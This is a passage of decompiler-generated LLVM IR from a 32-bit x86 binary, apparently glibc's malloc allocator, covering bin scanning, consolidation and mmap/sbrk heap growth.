  %v0_804a6a4 = load i32, i32* @edx, align 4
  %v1_804a6a4 = add i32 %v0_804a6a4, 12
  %v2_804a6a4 = inttoptr i32 %v1_804a6a4 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a6a4, align 4
  %v0_804a6ab = load i32, i32* %eax.global-to-local, align 4
  %v1_804a6ab = load i32, i32* @edx, align 4
  %v2_804a6ab = add i32 %v1_804a6ab, 4
  %v3_804a6ab = inttoptr i32 %v2_804a6ab to i32*
  store i32 %v0_804a6ab, i32* %v3_804a6ab, align 4
  %v0_804a6ae = load i32, i32* %esi.global-to-local, align 4
  %v1_804a6ae = load i32, i32* @edx, align 4
  %v3_804a6ae = add i32 %v1_804a6ae, %v0_804a6ae
  %v4_804a6ae = inttoptr i32 %v3_804a6ae to i32*
  store i32 %v0_804a6ae, i32* %v4_804a6ae, align 4
  br label %dec_label_pc_804abb0

dec_label_pc_804a6b8:                             ; preds = %dec_label_pc_804a64c, %dec_label_pc_804a63c
  %v4_804a663 = phi i32 [ %storemerge1.pre, %dec_label_pc_804a63c ], [ %v3_804a64f, %dec_label_pc_804a64c ]
  store i32 %v4_804a663, i32* %eax.global-to-local, align 4
  %v12_804a6b8 = icmp eq i32 %v4_804a663, %v2_804a640
  %v1_804a6ba = icmp eq i1 %v12_804a6b8, false
  br i1 %v1_804a6ba, label %dec_label_pc_804a64c, label %dec_label_pc_804a6bc.loopexit

dec_label_pc_804a6bc.loopexit:                    ; preds = %dec_label_pc_804a6b8
  br label %dec_label_pc_804a6bc

dec_label_pc_804a6bc:                             ; preds = %dec_label_pc_804a6bc.loopexit, %dec_label_pc_804a62e
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804a6c5 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_804a6c5, i32* %ecx.global-to-local, align 4
  %v2_804a6c8 = udiv i32 %v1_804a6c5, 32
  store i32 %v2_804a6c8, i32* @edi, align 4
  %v1_804a6cb = mul nuw nsw i32 %v2_804a6c8, 4
  %v2_804a6cb = add i32 %v1_804a6cb, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a6cb = inttoptr i32 %v2_804a6cb to i32*
  %v4_804a6cb = load i32, i32* %v3_804a6cb, align 4
  store i32 %v4_804a6cb, i32* %edx.global-to-local, align 4
  %v1_804a6d2 = mul i32 %v1_804a6c5, 8
  %v2_804a6d2 = add i32 %v1_804a6d2, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a6d2, i32* %ebx.global-to-local, align 4
  %v1_804a6d9 = urem i32 %v1_804a6c5, 32
  %v2_804a6d9 = icmp eq i32 %v1_804a6d9, 0
  store i32 %v1_804a6d9, i32* %ecx.global-to-local, align 4
  br i1 %v2_804a6d9, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_804a6bc
  %v5_804a6dc = shl i32 1, %v1_804a6d9
  store i32 %v5_804a6dc, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804a6bc, %bb83, %dec_label_pc_804a71d
  %v1_804a6de = phi i32 [ %v1_804a6de.pre, %dec_label_pc_804a71d ], [ %v4_804a6cb, %bb83 ], [ %v4_804a6cb, %dec_label_pc_804a6bc ]
  %v0_804a6e2 = phi i32 [ %v0_804a6de.pre, %dec_label_pc_804a71d ], [ %v5_804a6dc, %bb83 ], [ 1, %dec_label_pc_804a6bc ]
  %tmp84 = icmp ule i32 %v0_804a6e2, %v1_804a6de
  %v1_804a6e2 = icmp eq i32 %v0_804a6e2, 0
  %v1_804a6e4 = icmp eq i1 %v1_804a6e2, false
  %or.cond = and i1 %tmp84, %v1_804a6e4
  br i1 %or.cond, label %dec_label_pc_804a6e2.dec_label_pc_804a712.preheader_crit_edge, label %dec_label_pc_804a6e6.preheader

dec_label_pc_804a6e2.dec_label_pc_804a712.preheader_crit_edge: ; preds = %.preheader
  %v0_804a70d12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a712.preheader

dec_label_pc_804a6e6.preheader:                   ; preds = %.preheader
  %v0_804a6e6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804a6e6

dec_label_pc_804a6e6:                             ; preds = %dec_label_pc_804a6e6.preheader, %dec_label_pc_804a6f0
  %v0_804a6e6 = phi i32 [ %v0_804a6e6.pre, %dec_label_pc_804a6e6.preheader ], [ %v1_804a6e6, %dec_label_pc_804a6f0 ]
  %v1_804a6e6 = add i32 %v0_804a6e6, 1
  store i32 %v1_804a6e6, i32* @edi, align 4
  %v6_804a6ea = icmp ugt i32 %v1_804a6e6, 2
  br i1 %v6_804a6ea, label %dec_label_pc_804a7a1.loopexit, label %dec_label_pc_804a6f0

dec_label_pc_804a6f0:                             ; preds = %dec_label_pc_804a6e6
  %v1_804a6f0 = mul i32 %v1_804a6e6, 4
  %v2_804a6f0 = add i32 %v1_804a6f0, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a6f0 = inttoptr i32 %v2_804a6f0 to i32*
  %v4_804a6f0 = load i32, i32* %v3_804a6f0, align 4
  store i32 %v4_804a6f0, i32* %edx.global-to-local, align 4
  %v1_804a6f7 = icmp eq i32 %v4_804a6f0, 0
  br i1 %v1_804a6f7, label %dec_label_pc_804a6e6, label %dec_label_pc_804a6fb

dec_label_pc_804a6fb:                             ; preds = %dec_label_pc_804a6f0
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804a702 = mul i32 %v1_804a6e6, 256
  store i32 %v2_804a702, i32* %eax.global-to-local, align 4
  %v1_804a705 = add i32 %v2_804a702, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v1_804a705, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a712.preheader

dec_label_pc_804a712.preheader:                   ; preds = %dec_label_pc_804a6e2.dec_label_pc_804a712.preheader_crit_edge, %dec_label_pc_804a6fb
  %v0_804a70d12 = phi i32 [ %v1_804a705, %dec_label_pc_804a6fb ], [ %v0_804a70d12.pre, %dec_label_pc_804a6e2.dec_label_pc_804a712.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804a6fb ], [ %v0_804a6e2, %dec_label_pc_804a6e2.dec_label_pc_804a712.preheader_crit_edge ]
  %v0_804a723 = phi i32 [ %v4_804a6f0, %dec_label_pc_804a6fb ], [ %v1_804a6de, %dec_label_pc_804a6e2.dec_label_pc_804a712.preheader_crit_edge ]
  %v2_804a7124 = and i32 %v0_804a723, %esi.promoted
  %v3_804a7125 = icmp eq i32 %v2_804a7124, 0
  br i1 %v3_804a7125, label %dec_label_pc_804a70d, label %dec_label_pc_804a716

dec_label_pc_804a70d:                             ; preds = %dec_label_pc_804a712.preheader, %dec_label_pc_804a70d
  %v2_804a71014 = phi i32 [ %v2_804a710, %dec_label_pc_804a70d ], [ %esi.promoted, %dec_label_pc_804a712.preheader ]
  %v0_804a70d13 = phi i32 [ %v1_804a70d, %dec_label_pc_804a70d ], [ %v0_804a70d12, %dec_label_pc_804a712.preheader ]
  %v1_804a70d = add i32 %v0_804a70d13, 8
  %v2_804a710 = mul i32 %v2_804a71014, 2
  %v2_804a712 = and i32 %v2_804a710, %v0_804a723
  %v3_804a712 = icmp eq i32 %v2_804a712, 0
  br i1 %v3_804a712, label %dec_label_pc_804a70d, label %dec_label_pc_804a712.dec_label_pc_804a716_crit_edge

dec_label_pc_804a712.dec_label_pc_804a716_crit_edge: ; preds = %dec_label_pc_804a70d
  store i32 %v1_804a70d, i32* %ebx.global-to-local, align 4
  store i32 %v2_804a710, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a716

dec_label_pc_804a716:                             ; preds = %dec_label_pc_804a712.dec_label_pc_804a716_crit_edge, %dec_label_pc_804a712.preheader
  %v0_804a71d = phi i32 [ %v2_804a710, %dec_label_pc_804a712.dec_label_pc_804a716_crit_edge ], [ %esi.promoted, %dec_label_pc_804a712.preheader ]
  %v1_804a740 = phi i32 [ %v1_804a70d, %dec_label_pc_804a712.dec_label_pc_804a716_crit_edge ], [ %v0_804a70d12, %dec_label_pc_804a712.preheader ]
  %v1_804a716 = add i32 %v1_804a740, 12
  %v2_804a716 = inttoptr i32 %v1_804a716 to i32*
  %v3_804a716 = load i32, i32* %v2_804a716, align 4
  store i32 %v3_804a716, i32* @ecx, align 4
  %v12_804a719 = icmp eq i32 %v3_804a716, %v1_804a740
  %v1_804a71b = icmp eq i1 %v12_804a719, false
  br i1 %v1_804a71b, label %dec_label_pc_804a731, label %dec_label_pc_804a71d

dec_label_pc_804a71d:                             ; preds = %dec_label_pc_804a716
  %v2_804a71f = mul i32 %v0_804a71d, 2
  store i32 %v2_804a71f, i32* %esi.global-to-local, align 4
  %v1_804a721 = sub i32 -1, %v0_804a71d
  store i32 %v1_804a721, i32* %eax.global-to-local, align 4
  %v2_804a723 = and i32 %v0_804a723, %v1_804a721
  store i32 %v2_804a723, i32* %edx.global-to-local, align 4
  %v1_804a725 = add i32 %v3_804a716, 8
  store i32 %v1_804a725, i32* %ebx.global-to-local, align 4
  %v1_804a728 = load i32, i32* @edi, align 4
  %v2_804a728 = mul i32 %v1_804a728, 4
  %v3_804a728 = add i32 %v2_804a728, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v4_804a728 = inttoptr i32 %v3_804a728 to i32*
  store i32 %v2_804a723, i32* %v4_804a728, align 4
  %v0_804a6de.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804a6de.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804a731:                             ; preds = %dec_label_pc_804a716
  %v1_804a731 = add i32 %v3_804a716, 4
  %v2_804a731 = inttoptr i32 %v1_804a731 to i32*
  %v3_804a731 = load i32, i32* %v2_804a731, align 4
  store i32 %v3_804a731, i32* %edx.global-to-local, align 4
  %v1_804a734 = add i32 %v3_804a716, 12
  %v2_804a734 = inttoptr i32 %v1_804a734 to i32*
  %v3_804a734 = load i32, i32* %v2_804a734, align 4
  store i32 %v3_804a734, i32* %eax.global-to-local, align 4
  %v1_804a737 = and i32 %v3_804a731, -4
  store i32 %v1_804a737, i32* @edx, align 4
  %v5_804a73c = sub i32 %v1_804a737, %v1_804a836
  store i32 %v5_804a73c, i32* %esi.global-to-local, align 4
  store i32 %v3_804a734, i32* %v2_804a716, align 4
  %v0_804a743 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a743 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a743 = add i32 %v1_804a743, 8
  %v3_804a743 = inttoptr i32 %v2_804a743 to i32*
  store i32 %v0_804a743, i32* %v3_804a743, align 4
  %v0_804a746 = load i32, i32* %esi.global-to-local, align 4
  %tmp130 = icmp ult i32 %v0_804a746, 16
  %v0_804a74b = load i32, i32* @ecx, align 4
  br i1 %tmp130, label %dec_label_pc_804a74b, label %dec_label_pc_804a752

dec_label_pc_804a74b:                             ; preds = %dec_label_pc_804a731
  %v1_804a74b = load i32, i32* @edx, align 4
  %v2_804a74b = add i32 %v0_804a74b, 4
  %v3_804a74b = add i32 %v2_804a74b, %v1_804a74b
  %v4_804a74b = inttoptr i32 %v3_804a74b to i32*
  %v5_804a74b = load i32, i32* %v4_804a74b, align 4
  %v6_804a74b = or i32 %v5_804a74b, 1
  store i32 %v6_804a74b, i32* %v4_804a74b, align 4
  br label %dec_label_pc_804a799

dec_label_pc_804a752:                             ; preds = %dec_label_pc_804a731
  %v2_804a756 = add i32 %v0_804a74b, %v1_804a836
  store i32 %v2_804a756, i32* %eax.global-to-local, align 4
  %v1_804a75f = load i32, i32* @ebp, align 4
  %v2_804a75f = add i32 %v1_804a75f, 8
  %v3_804a75f = inttoptr i32 %v2_804a75f to i32*
  store i32 %v2_804a756, i32* %v3_804a75f, align 4
  %v0_804a762 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a762 = load i32, i32* @ebp, align 4
  %v2_804a762 = add i32 %v1_804a762, 12
  %v3_804a762 = inttoptr i32 %v2_804a762 to i32*
  store i32 %v0_804a762, i32* %v3_804a762, align 4
  %v0_804a765 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a765 = add i32 %v0_804a765, 8
  %v2_804a765 = inttoptr i32 %v1_804a765 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a765, align 4
  %v0_804a76c = load i32, i32* %eax.global-to-local, align 4
  %v1_804a76c = add i32 %v0_804a76c, 12
  %v2_804a76c = inttoptr i32 %v1_804a76c to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a76c, align 4
  %v0_804a773 = load i32, i32* @global_var_8054630.39, align 16
  %v4_804a779 = load i32, i32* %eax.global-to-local, align 4
  %v5_804a779 = select i1 %v8_804a4df, i32 %v4_804a779, i32 %v0_804a773
  %v4_804a77c = or i32 %v1_804a836, 1
  store i32 %v5_804a779, i32* @global_var_8054630.39, align 16
  %v0_804a787 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804a77c, i32* %ebx.global-to-local, align 4
  %v1_804a78d = or i32 %v0_804a787, 1
  store i32 %v1_804a78d, i32* @edx, align 4
  %v3_804a790 = add i32 %v0_804a787, %v4_804a779
  %v4_804a790 = inttoptr i32 %v3_804a790 to i32*
  store i32 %v0_804a787, i32* %v4_804a790, align 4
  %v0_804a793 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a793 = load i32, i32* @ecx, align 4
  %v2_804a793 = add i32 %v1_804a793, 4
  %v3_804a793 = inttoptr i32 %v2_804a793 to i32*
  store i32 %v0_804a793, i32* %v3_804a793, align 4
  %v0_804a796 = load i32, i32* @edx, align 4
  %v1_804a796 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a796 = add i32 %v1_804a796, 4
  %v3_804a796 = inttoptr i32 %v2_804a796 to i32*
  store i32 %v0_804a796, i32* %v3_804a796, align 4
  br label %dec_label_pc_804a799

dec_label_pc_804a799:                             ; preds = %dec_label_pc_804a88d, %dec_label_pc_804a74b, %dec_label_pc_804a752
  %v0_804a799 = load i32, i32* @ecx, align 4
  %v1_804a799 = add i32 %v0_804a799, 8
  store i32 %v1_804a799, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804abc1

dec_label_pc_804a7a1.loopexit:                    ; preds = %dec_label_pc_804a6e6
  br label %dec_label_pc_804a7a1

dec_label_pc_804a7a1:                             ; preds = %dec_label_pc_804a7a1.loopexit, %dec_label_pc_804a4a1, %dec_label_pc_804a4a9
  %v0_804a7a1 = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804a7a1, i32* @ebx, align 4
  store i32 %v1_804a836, i32* %esi.global-to-local, align 4
  %v1_804a7ab = add i32 %v0_804a7a1, 4
  %v2_804a7ab = inttoptr i32 %v1_804a7ab to i32*
  %v3_804a7ab = load i32, i32* %v2_804a7ab, align 4
  %v1_804a7ae = add i32 %v1_804a836, 16
  store i32 %v1_804a7ae, i32* @esi, align 4
  %v1_804a7b5 = and i32 %v3_804a7ab, -4
  store i32 %v1_804a7b5, i32* %ecx.global-to-local, align 4
  %v7_804a7b8 = icmp ult i32 %v1_804a7b5, %v1_804a7ae
  br i1 %v7_804a7b8, label %dec_label_pc_804a7d8, label %dec_label_pc_804a7bc

dec_label_pc_804a7bc:                             ; preds = %dec_label_pc_804a7a1
  %v2_804a7c0 = add i32 %v0_804a7a1, %v1_804a836
  store i32 %v2_804a7c0, i32* @edx, align 4
  %v1_804a7c3 = or i32 %v1_804a836, 1
  store i32 %v1_804a7c3, i32* %eax.global-to-local, align 4
  store i32 %v2_804a7c0, i32* @global_var_805462c.38, align 4
  store i32 %v1_804a7c3, i32* %v2_804a7ab, align 4
  %v0_804a7cf = load i32, i32* %ecx.global-to-local, align 4
  %v5_804a7cf = sub i32 %v0_804a7cf, %v1_804a836
  store i32 %v5_804a7cf, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ab51

dec_label_pc_804a7d8:                             ; preds = %dec_label_pc_804a7a1
  %v0_804a7d8 = load i8, i8* @global_var_8054600.37, align 512
  %v1_804a7d8 = and i8 %v0_804a7d8, 2
  %v2_804a7d8 = icmp eq i8 %v1_804a7d8, 0
  %v0_804a7df = load i32, i32* @global_var_805495c.43, align 4
  store i32 %v0_804a7df, i32* %edx.global-to-local, align 4
  br i1 %v2_804a7d8, label %dec_label_pc_804a80c, label %dec_label_pc_804a7e7

dec_label_pc_804a7e7:                             ; preds = %dec_label_pc_804a7d8
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a7ef = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @ebx, align 4
  %v1_804a7f9 = add i32 %v1_804a836, -7
  store i32 %v1_804a7f9, i32* %eax.global-to-local, align 4
  store i32 %v1_804a7f9, i32* %stack_var_-92, align 4
  %v1_804a7fd = call i32 @malloc(i32 %v1_804a7f9)
  store i32 %v1_804a7fd, i32* %eax.global-to-local, align 4
  store i32 %v1_804a7fd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804abc1

dec_label_pc_804a80c:                             ; preds = %dec_label_pc_804a7d8
  store i32 %v1_804a836, i32* @ebx, align 4
  %v1_804a810 = add i32 %v0_804a7df, -1
  store i32 %v1_804a810, i32* @ecx, align 4
  %v1_804a813 = load i32, i32* @global_var_805494c.44, align 4
  %v7_804a813 = icmp ult i32 %v1_804a836, %v1_804a813
  br i1 %v7_804a813, label %dec_label_pc_804a8ee, label %dec_label_pc_804a823

dec_label_pc_804a823:                             ; preds = %dec_label_pc_804a80c
  %v0_804a823 = load i32, i32* @global_var_8054950.45, align 16
  store i32 %v0_804a823, i32* %eax.global-to-local, align 4
  %v1_804a828 = load i32, i32* @global_var_8054954.46, align 4
  %v5_804a82e = icmp slt i32 %v0_804a823, %v1_804a828
  br i1 %v5_804a82e, label %dec_label_pc_804a834, label %dec_label_pc_804a8ee

dec_label_pc_804a834:                             ; preds = %dec_label_pc_804a823
  %v2_804a836 = add i32 %v1_804a836, 10
  %v3_804a836 = add i32 %v2_804a836, %v0_804a7df
  %v1_804a83a = sub i32 0, %v0_804a7df
  store i32 %v1_804a83a, i32* %eax.global-to-local, align 4
  %v2_804a83c = and i32 %v3_804a836, %v1_804a83a
  store i32 %v2_804a83c, i32* @ebx, align 4
  %tmp131 = icmp ugt i32 %v2_804a83c, %v1_804a836
  br i1 %tmp131, label %dec_label_pc_804a848, label %dec_label_pc_804a8ee

dec_label_pc_804a848:                             ; preds = %dec_label_pc_804a834
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804a855 = call i32 @mmap(i32 0, i32 %v2_804a83c, i32 3, i32 34, i32 0, i32 0, i32 %v1_804a810, i32 %v1_804a810)
  store i32 %v8_804a855, i32* %eax.global-to-local, align 4
  %v10_804a85d = icmp eq i32 %v8_804a855, -1
  store i32 %v8_804a855, i32* %edx.global-to-local, align 4
  br i1 %v10_804a85d, label %dec_label_pc_804a848.dec_label_pc_804a8ee_crit_edge, label %dec_label_pc_804a868

dec_label_pc_804a848.dec_label_pc_804a8ee_crit_edge: ; preds = %dec_label_pc_804a848
  %v0_804a8ee.pre = load i32, i32* @global_var_805462c.38, align 4
  br label %dec_label_pc_804a8ee

dec_label_pc_804a868:                             ; preds = %dec_label_pc_804a848
  %v1_804a86a = urem i32 %v8_804a855, 8
  %v2_804a86a = icmp eq i32 %v1_804a86a, 0
  store i32 %v1_804a86a, i32* %ecx.global-to-local, align 4
  br i1 %v2_804a86a, label %dec_label_pc_804a883, label %dec_label_pc_804a86f

dec_label_pc_804a86f:                             ; preds = %dec_label_pc_804a868
  %v0_804a874 = load i32, i32* @ebx, align 4
  %v2_804a876 = sub nsw i32 8, %v1_804a86a
  store i32 %v2_804a876, i32* %eax.global-to-local, align 4
  %v2_804a878 = add i32 %v2_804a876, %v8_804a855
  store i32 %v2_804a878, i32* @ecx, align 4
  %v2_804a87b = sub i32 %v0_804a874, %v2_804a876
  store i32 %v2_804a87b, i32* %esi.global-to-local, align 4
  %v2_804a87d = inttoptr i32 %v2_804a878 to i32*
  store i32 %v2_804a876, i32* %v2_804a87d, align 4
  br label %dec_label_pc_804a88d

dec_label_pc_804a883:                             ; preds = %dec_label_pc_804a868
  store i32 %v8_804a855, i32* @ecx, align 4
  %v1_804a885 = inttoptr i32 %v8_804a855 to i32*
  store i32 0, i32* %v1_804a885, align 4
  br label %dec_label_pc_804a88d

dec_label_pc_804a88d:                             ; preds = %dec_label_pc_804a86f, %dec_label_pc_804a883
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804a86f ], [ @ebx, %dec_label_pc_804a883 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804a88d = or i32 %storemerge, 2
  %v1_804a890 = load i32, i32* @ecx, align 4
  %v2_804a890 = add i32 %v1_804a890, 4
  %v3_804a890 = inttoptr i32 %v2_804a890 to i32*
  store i32 %v1_804a88d, i32* %v3_804a890, align 4
  %v0_804a893 = load i32, i32* @global_var_8054950.45, align 16
  %v0_804a898 = load i32, i32* @global_var_8054970.47, align 16
  %v1_804a89e = add i32 %v0_804a893, 1
  %v1_804a89f = load i32, i32* @global_var_8054958.48, align 8
  %v2_804a89f = sub i32 %v1_804a89e, %v1_804a89f
  %v8_804a89f = xor i32 %v1_804a89f, %v1_804a89e
  %v9_804a89f = xor i32 %v2_804a89f, %v1_804a89e
  %v10_804a89f = and i32 %v9_804a89f, %v8_804a89f
  %v11_804a89f = icmp slt i32 %v10_804a89f, 0
  %v12_804a89f = icmp eq i32 %v2_804a89f, 0
  %v13_804a89f = icmp slt i32 %v2_804a89f, 0
  store i32 %v1_804a89e, i32* @global_var_8054950.45, align 16
  %v3_804a8aa = icmp ne i1 %v13_804a89f, %v11_804a89f
  %v4_804a8aa = or i1 %v12_804a89f, %v3_804a8aa
  %v7_804a8aa = select i1 %v4_804a8aa, i32 %v1_804a89f, i32 %v1_804a89e
  store i32 %v7_804a8aa, i32* @global_var_8054958.48, align 8
  %v0_804a8b6 = load i32, i32* @global_var_8054964.49, align 4
  %v1_804a8bb = load i32, i32* @ebx, align 4
  %v2_804a8bb = add i32 %v1_804a8bb, %v0_804a8b6
  store i32 %v2_804a8bb, i32* @global_var_8054964.49, align 4
  %tmp86 = icmp ule i32 %v2_804a8bb, %v0_804a898
  %v5_804a8c8 = select i1 %tmp86, i32 %v0_804a898, i32 %v2_804a8bb
  store i32 %v5_804a8c8, i32* @edx, align 4
  %v1_804a8cb = load i32, i32* @global_var_8054968.50, align 8
  %v2_804a8cb = add i32 %v1_804a8cb, %v2_804a8bb
  store i32 %v5_804a8c8, i32* @global_var_8054970.47, align 16
  %v1_804a8d7 = load i32, i32* @global_var_8054974.51, align 4
  %tmp132 = icmp ule i32 %v2_804a8cb, %v1_804a8d7
  %v5_804a8dd = select i1 %tmp132, i32 %v1_804a8d7, i32 %v2_804a8cb
  store i32 %v5_804a8dd, i32* %eax.global-to-local, align 4
  store i32 %v5_804a8dd, i32* @global_var_8054974.51, align 4
  br label %dec_label_pc_804a799

dec_label_pc_804a8ee:                             ; preds = %dec_label_pc_804a834, %dec_label_pc_804a848.dec_label_pc_804a8ee_crit_edge, %dec_label_pc_804a823, %dec_label_pc_804a80c
  %v0_804a8ee = phi i32 [ %v0_804a8ee.pre, %dec_label_pc_804a848.dec_label_pc_804a8ee_crit_edge ], [ %v0_804a7a1, %dec_label_pc_804a823 ], [ %v0_804a7a1, %dec_label_pc_804a834 ], [ %v0_804a7a1, %dec_label_pc_804a80c ]
  store i32 %v0_804a8ee, i32* %eax.global-to-local, align 4
  %v1_804a8f7 = add i32 %v0_804a8ee, 4
  %v2_804a8f7 = inttoptr i32 %v1_804a8f7 to i32*
  %v3_804a8f7 = load i32, i32* %v2_804a8f7, align 4
  %v1_804a8fe = and i32 %v3_804a8f7, -4
  %v2_804a8fe = icmp eq i32 %v1_804a8fe, 0
  store i32 %v1_804a8fe, i32* @ebp, align 4
  %v1_804a904 = load i32, i32* @global_var_8054948.52, align 8
  %v0_804a90e = load i8, i8* @global_var_8054960.53, align 32
  %v1_804a90e = urem i8 %v0_804a90e, 2
  %v2_804a90e = icmp eq i8 %v1_804a90e, 0
  %v1_804a915 = icmp eq i1 %v2_804a90e, false
  %v1_804a8fe.op = sub i32 0, %v1_804a8fe
  %v2_804a90c.neg = select i1 %v1_804a915, i32 %v1_804a8fe.op, i32 0
  %v2_804a904 = add i32 %v1_804a810, %v1_804a7ae
  %v4_804a915 = add i32 %v2_804a904, %v1_804a904
  %v5_804a91c = add i32 %v4_804a915, %v2_804a90c.neg
  store i32 %v5_804a91c, i32* %eax.global-to-local, align 4
  %v1_804a920 = sub i32 0, %v0_804a7df
  store i32 %v1_804a920, i32* @edx, align 4
  %v2_804a924 = and i32 %v5_804a91c, %v1_804a920
  store i32 %v2_804a924, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_804a924, 1
  br i1 %tmp87, label %dec_label_pc_804a942, label %dec_label_pc_804a92c

dec_label_pc_804a92c:                             ; preds = %dec_label_pc_804a8ee
  store i32 %v2_804a924, i32* %stack_var_-92, align 4
  %v1_804a930 = call i32 @__GI_sbrk(i32 %v2_804a924)
  store i32 %v1_804a930, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_804a93b = icmp eq i32 %v1_804a930, -1
  store i32 %v1_804a930, i32* @ebx, align 4
  %v1_804a940 = icmp eq i1 %v10_804a93b, false
  br i1 %v1_804a940, label %dec_label_pc_804a999, label %dec_label_pc_804a92c.dec_label_pc_804a942_crit_edge

dec_label_pc_804a92c.dec_label_pc_804a942_crit_edge: ; preds = %dec_label_pc_804a92c
  %v0_804a942.pre = load i8, i8* @global_var_8054960.53, align 32
  br label %dec_label_pc_804a942

dec_label_pc_804a942:                             ; preds = %dec_label_pc_804a92c.dec_label_pc_804a942_crit_edge, %dec_label_pc_804a8ee
  %v0_804a96f = phi i32 [ -1, %dec_label_pc_804a92c.dec_label_pc_804a942_crit_edge ], [ %v1_804a920, %dec_label_pc_804a8ee ]
  %v0_804a942 = phi i8 [ %v0_804a942.pre, %dec_label_pc_804a92c.dec_label_pc_804a942_crit_edge ], [ %v0_804a90e, %dec_label_pc_804a8ee ]
  %v1_804a942 = urem i8 %v0_804a942, 2
  %v2_804a942 = icmp eq i8 %v1_804a942, 0
  br i1 %v2_804a942, label %dec_label_pc_804a942.dec_label_pc_804a957_crit_edge, label %dec_label_pc_804a94b

dec_label_pc_804a942.dec_label_pc_804a957_crit_edge: ; preds = %dec_label_pc_804a942
  %v0_804a957.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a957

dec_label_pc_804a94b:                             ; preds = %dec_label_pc_804a942
  %v2_804a94f = add i32 %v1_804a8fe, %v1_804a810
  store i32 %v2_804a94f, i32* %eax.global-to-local, align 4
  %v0_804a951 = load i32, i32* @esi, align 4
  %v2_804a951 = add i32 %v0_804a951, %v2_804a94f
  %v5_804a953 = and i32 %v2_804a951, %v1_804a920
  store i32 %v5_804a953, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a957

dec_label_pc_804a957:                             ; preds = %dec_label_pc_804a942.dec_label_pc_804a957_crit_edge, %dec_label_pc_804a94b
  %v3_804a962 = phi i32 [ %v0_804a957.pre, %dec_label_pc_804a942.dec_label_pc_804a957_crit_edge ], [ %v5_804a953, %dec_label_pc_804a94b ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_804a962, 1048576
  %v5_804a962 = select i1 %tmp88, i32 1048576, i32 %v3_804a962
  store i32 %v5_804a962, i32* @esi, align 4
  %tmp133 = icmp ugt i32 %v5_804a962, %v1_804a836
  br i1 %tmp133, label %dec_label_pc_804a96f, label %dec_label_pc_804abb4

dec_label_pc_804a96f:                             ; preds = %dec_label_pc_804a957
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804a97c = call i32 @mmap(i32 0, i32 %v5_804a962, i32 3, i32 34, i32 0, i32 0, i32 %v0_804a96f, i32 %v0_804a96f)
  store i32 %v8_804a97c, i32* %eax.global-to-local, align 4
  %v10_804a984 = icmp eq i32 %v8_804a97c, -1
  store i32 %v8_804a97c, i32* @ebx, align 4
  br i1 %v10_804a984, label %dec_label_pc_804abb4, label %dec_label_pc_804a98f

dec_label_pc_804a98f:                             ; preds = %dec_label_pc_804a96f
  %v0_804a98f = load i8, i8* @global_var_8054960.53, align 1
  %v2_804a98f = and i8 %v0_804a98f, -2
  store i8 %v2_804a98f, i8* @global_var_8054960.53, align 32
  %v1_804a996 = load i32, i32* @esi, align 4
  %v2_804a996 = add i32 %v1_804a996, %v8_804a97c
  store i32 %v2_804a996, i32* @edx, align 4
  br label %dec_label_pc_804a999

dec_label_pc_804a999:                             ; preds = %dec_label_pc_804a92c, %dec_label_pc_804a98f
  %v0_804aa60 = phi i32 [ -1, %dec_label_pc_804a92c ], [ %v2_804a996, %dec_label_pc_804a98f ]
  %v0_804aa6e = phi i32 [ %v1_804a930, %dec_label_pc_804a92c ], [ %v8_804a97c, %dec_label_pc_804a98f ]
  %v10_804a999 = icmp eq i32 %v0_804aa6e, -1
  br i1 %v10_804a999, label %dec_label_pc_804abb4, label %dec_label_pc_804a9a2

dec_label_pc_804a9a2:                             ; preds = %dec_label_pc_804a999
  %v0_804a9a6 = load i32, i32* @global_var_8054968.50, align 8
  %v1_804a9a6 = load i32, i32* @esi, align 4
  %v2_804a9a6 = add i32 %v1_804a9a6, %v0_804a9a6
  store i32 %v2_804a9a6, i32* @global_var_8054968.50, align 8
  %v2_804a9ac = add i32 %v1_804a8fe, %v0_804a8ee
